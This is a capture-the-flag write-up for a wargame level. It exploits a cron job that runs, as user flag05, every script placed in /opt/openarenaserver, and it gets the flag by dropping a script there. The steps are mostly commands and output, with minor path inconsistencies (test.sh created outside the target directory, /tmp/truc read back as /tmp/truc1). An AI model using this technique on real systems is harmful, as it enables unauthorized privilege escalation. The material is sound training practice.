# Level05
## Step by step
- The user `level05` home directory is empty
  ```bash
  > ls
  ```
- Let scan the VM for anything that can be owned by `level05`
  ```bash
  > find / -type f -name "level05" 2>/dev/null

  /var/mail/level05
  /rofs/var/mail/level05
  ```
- The file `level05` in `/var/mail` contains:
  ```
  */2 * * * * su -c "sh /usr/sbin/openarenaserver" - flag05
  ```
- The file `/usr/sbin/openarenaserver` contains this:
  ```
  #!/bin/sh

  for i in /opt/openarenaserver/* ; do
  	(ulimit -t 5; bash -x "$i")
  	rm -f "$i"
  done
  ```
- I need to create a file in `/opt/openarenaserver/` that will run the command `getflag` and print it
  ```bash
  > cat << end > test.sh
  > getflag >/tmp/truc
  > end

  > cat /tmp/truc1  #after 2mins of the crontab
  Check flag.Here is your token : XXX
  ```



  
